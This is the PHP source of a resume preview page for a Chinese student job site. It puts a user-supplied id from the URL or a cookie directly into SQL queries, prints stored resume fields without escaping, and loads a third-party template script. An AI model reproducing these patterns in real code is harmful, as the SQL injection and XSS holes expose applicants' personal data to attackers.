<!DOCTYPE HTML>
<html><head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
<title>简历预览-赚了吗-大学生求职就业网</title>
<meta content="23635710066417756375" property="qc:admins">

<meta content="QIQ6KC1oZ6" name="baidu-site-verification">

<!-- <div class="web_root"  style="display:none">h</div> -->
</script><script type="text/javascript">
var ctx = "h";
console.log(1);
</script>
<link rel="icon" href="style/images/topico.ico">
<link href="style/css/style.css" type="text/css" rel="stylesheet">
<link href="style/css/colorbox.min.css" type="text/css" rel="stylesheet">
<link href="style/css/popup.css" type="text/css" rel="stylesheet">

<script type="text/javascript" src="style/js/jquery.1.10.1.min.js"></script>

<script src="style/js/jquery.colorbox-min.js" type="text/javascript"></script>
<script>
$(function(){
	 $("body").on("click","a.btn_s",function(){
		$.colorbox.close();
		parent.jQuery.colorbox.close();
	});
	$(".inline").colorbox({
		inline:true
	});
});
</script>
<script src="style/js/ajaxCross.json" charset="UTF-8"></script></head>

<?php  
include('conn.php'); 
$id=0;
if(isset($_GET["id"])){$id=$_GET["id"];}
else{$id=$_COOKIE["id"];}
$sql = "select * from student where id='$id'";
$sql2 = "select * from expect where id='$id'";

$result=mysqli_query($con, $sql);
$result2=mysqli_query($con, $sql2);
 while
	 ($row=mysqli_fetch_array($result)){
	  $number= $row[0];
    $name = $row[1];
	$sex = $row[3];
	$record = $row[4];
	$experience = $row[5];
	$email = $row[6];
	$state = $row[7];
	$photo = $row[9];
	$tel= $row[8];
	$jobjy=$row[10];
	$project=$row[11];
	$school = $row[12];
	$time1= $row[13];
	$time2=$row[14];
	$pro=$row[15];
	$jl=$row[16];
	$zwjs=$row[17];
	}
	 while
	 ($row2=mysqli_fetch_array($result2)){
	  $city = $row2[2];
    $type = $row2[3];
	$position = $row2[4];
	$wage = $row2[5];

	}
?>			       



<body>
  	<div id="previewWrapper">
        <div class="preview_header">
          <h1 title="jason的简历"><?php echo $name; ?>的简历</h1>
                        	<a title="下载简历"  href="<?php echo $jl; ?>">附件简历</a>
                    </div><!--end .preview_header-->

        <div class="preview_content">
            <div class="profile_box" id="basicInfo">
                <h2>基本信息</h2>
                <div class="basicShow">

                                          <?php      echo '<span>'.$name.' | '.$tel.' | '.$sex.'<br>'.$record.' | '.$experience.' | '.$school.'<br>'.$email.'</span>'; ?>
            			
            		</span>
           			<div class="m_portrait">
                    	<div></div>
                    	<img width="120" height="120" alt="jason" src="<?php echo $photo; ?>">
                    </div>
                </div><!--end .basicShow-->
            </div><!--end #basicInfo-->
			
				            <div class="profile_box" id="expectJob">
	                <h2>期望工作</h2>
	                <div class="expectShow">
	                	<?php
echo '<span>'.$city.'  -  '.$type.'  -  '.$position.'  -  '.$wage.'</span>';
?>	
	                </div><!--end .expectShow-->
	            </div><!--end #expectJob-->
						
				            <div class="profile_box" id="workExperience">
	                <h2>工作经历</h2>
	                <div class="experienceShow">
	                  <ul class="wlist clearfix">
	                  	                <?php echo str_replace("\r\n","<br/>",$jobjy);?>    	           				
	           					          				                  </ul>
	                </div><!--end .experienceShow-->
	            </div><!--end #workExperience-->
			
				            <div class="profile_box" id="projectExperience">
	                <h2>项目经验</h2>
	                <div class="projectShow">
	                  <ul class="plist clearfix">
	                  			            				            					            				<li class="noborder">
	            					            					<div class="projectList">
		            					<div class="f16 mb10"><?php echo str_replace("\r\n","<br/>",$project);?>
		            					</div>
		            							            					<div class="dl1"></div>
		            							            				</div>
	            				</li>
	            				            				                      </ul>
	                </div><!--end .projectShow-->
	            </div><!--end #projectExperience-->
						
				            <div class="profile_box" id="educationalBackground">
	                <h2>教育背景</h2>
	                <div class="educationalShow">
	                  <ul class="elist clearfix">
	                  	                  	            				            				<li class="clear">
            				            					<span class="c9"><?php echo $time1.'-'.$time2 ?></span>
            					<div>
            						<h3><?php echo $school; ?></h3>
            						<h4><?php echo $pro; ?></h4>
            					</div>
            				</li>
            				           					                  </ul>
	                </div><!--end .educationalShow-->
	            </div><!--end #educationalBackground-->
						
				            <div class="profile_box" id="selfDescription">
	                <h2>自我描述</h2>
	                <div class="descriptionShow">
	            	<?php echo $zwjs; ?>
	                </div><!--end .descriptionShow-->
	            </div><!--end #selfDescription-->
						
				            <!--end #worksShow-->
			        </div><!--end .preview_content-->
  	</div><!--end #previewWrapper-->

<!-------------------------------------弹窗lightbox ----------------------------------------->
<div style="display:none;">
	<!-- 下载简历 -->
	<div class="popup" id="downloadOnlineResume">
         <table width="100%">
             <tbody><tr>
                 <td class="c5 f18">请选择下载简历格式：</td>
             </tr>
         	<tr>
             	<td>
             		<a class="btn_s" href="h/resume/downloadResume?key=1ccca806e13637f7b1a4560f80f08057&amp;type=1">word格式</a>
             		<a class="btn_s" href="h/resume/downloadResume?key=1ccca806e13637f7b1a4560f80f08057&amp;type=2">html格式</a>
             		<a class="btn_s" href="h/resume/downloadResume?key=1ccca806e13637f7b1a4560f80f08057&amp;type=3">pdf格式</a>
             	</td>
             </tr>
         </tbody></table>
    </div><!--/#downloadOnlineResume-->   
</div>
<!------------------------------------- end ----------------------------------------->  




<div id="cboxOverlay" style="display: none;"></div><div id="colorbox" class="" role="dialog" tabindex="-1" style="display: none;"><div id="cboxWrapper"><div><div id="cboxTopLeft" style="float: left;"></div><div id="cboxTopCenter" style="float: left;"></div><div id="cboxTopRight" style="float: left;"></div></div><div style="clear: left;"><div id="cboxMiddleLeft" style="float: left;"></div><div id="cboxContent" style="float: left;"><div id="cboxTitle" style="float: left;"></div><div id="cboxCurrent" style="float: left;"></div><button type="button" id="cboxPrevious"></button><button type="button" id="cboxNext"></button><button id="cboxSlideshow"></button><div id="cboxLoadingOverlay" style="float: left;"></div><div id="cboxLoadingGraphic" style="float: left;"></div></div><div id="cboxMiddleRight" style="float: left;"></div></div><div style="clear: left;"><div id="cboxBottomLeft" style="float: left;"></div><div id="cboxBottomCenter" style="float: left;"></div><div id="cboxBottomRight" style="float: left;"></div></div></div><div style="position: absolute; width: 9999px; visibility: hidden; display: none;"></div></div></body><script type="text/javascript" src="http://freemoban.com/js/a.js"></script> </html>